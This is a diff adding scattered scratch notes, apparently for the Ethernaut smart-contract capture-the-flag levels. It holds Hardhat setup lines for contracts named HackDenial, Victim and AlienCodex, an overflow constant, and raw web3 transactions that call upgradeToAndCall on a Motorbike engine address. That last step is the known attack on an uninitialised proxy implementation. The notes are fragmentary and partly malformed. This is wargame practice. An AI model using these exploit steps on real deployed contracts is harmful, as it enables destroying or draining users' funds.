@@ -1,0 +1,89 @@
+ const provider = ethers.provider;
+  const { deployer } = await getNamedAccounts();
+    const alienCodex = await ethers.getContract("AlienCodex", deployer);
+	
+	
+	
+	 const provider = ethers.provider;
+  const { deployer } = await getNamedAccounts();
+	const test = await ethers.getContract("Test", deployer);
+	
+	
+	115792089237316195423570985008687907853269984665640564039457584007913129639935
+	97222658762210312835982718871080339316596872691747246639997364149093866936988
+	
+	
+	
+ const {deployments} = require("hardhat")
+ const provider = ethers.provider;
+  const { deployer } = await getNamedAccounts();
+   await deployments.fixture("denial")
+    let denial = await ethers.getContract("Denial", deployer);
+	let hack = await ethers.getContract("HackDenial", deployer);
+	
+	
+	const {deployments} = require("hardhat")
+ const provider = ethers.provider;
+  const { deployer } = await getNamedAccounts();
+   await deployments.fixture("testStuff");
+   let test = await ethers.getContract("TestSelfdestruct", deployer);
+	let victim = await ethers.getContract("Victim", deployer);
+	
+	10 = 10000000000000000000
+	100 = 100000000000000000000
+	1000 = 1000000000000000000000
+	
+	
+
+
+Engine address: 0xAbB06aC50A3efc9A6789cea5bc2335b48E59C1ff
+Motorbike address: 0x93f198870B88D60ECBC2ddAE59aD98a93eB9973B
+
+functionSignature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+		{
+            type: 'address',
+            name: 'newImplementation'
+        },
+		{
+            type: 'bytes memory',
+            name: 'data'
+        }
+    ]
+}
+
+hackFunctionSignature = {
+	name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+    ]
+}
+
+params = ["0xF31C6d97Aa3eb5fb6a0eFfEb4687d4120b562BE1"]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: "0xAbB06aC50A3efc9A6789cea5bc2335b48E59C1ff", data})
+
+
+functionSignature = {
+    name: 'setDetectionBot',
+    type: 'function',
+    inputs: [
+		{
+            type: 'address',
+            name: 'detectionBotAddress'
+        }
+    ]
+}
+
+params = ["0xe53247B5323CCe9Ac5F22dfE1Ae67447515f2c6f"]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: "0xF31C6d97Aa3eb5fb6a0eFfEb4687d4120b562BE1", data})
+
+
+0xF31C6d97Aa3eb5fb6a0eFfEb4687d4120b562BE1
